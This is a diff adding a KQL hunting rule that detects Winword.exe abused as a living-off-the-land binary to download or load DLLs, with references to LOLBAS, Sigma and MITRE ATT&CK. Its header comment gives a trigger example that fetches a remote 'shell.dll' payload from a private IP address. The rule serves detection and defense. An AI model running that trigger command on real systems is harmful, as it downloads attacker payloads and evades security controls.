@@ -1,0 +1,16 @@
+// Title: Winword.exe LOLBIN Usage
+// Desc: Detects Winword process loading custmom dlls via the '/l' switch 
+// Ref - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Winword/
+// Ref - https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191
+// Ref - https://attack.mitre.org/techniques/T1105/ (Defense Evasion: Indirect Command Execution)
+// Severity: high
+// Trigger: winword.exe "http://192.168.19.146/shell.dll"
+// Usecase: It will download a remote payload and place it in the cache folder
+// https://github.com/SigmaHQ/sigma/blob/master/rules/windowsproc_creation_win_lolbin_winword.yml
+// By: Frankie Li
+// On: 15-05-2023
+DeviceProcessEvents 
+| where ((FolderPath endswith @'\WINWORD.exe' or InitiatingProcessVersionInfoOriginalFileName =~ @'WinWord.exe' 
+    or ProcessVersionInfoOriginalFileName =~ @'WinWord.exe') and (ProcessCommandLine contains @'/l ' 
+    or ProcessCommandLine contains @'.dll'))
+| project Timestamp, DeviceName, AccountName, InitiatingProcessParentFileName, FolderPath, ProcessCommandLine
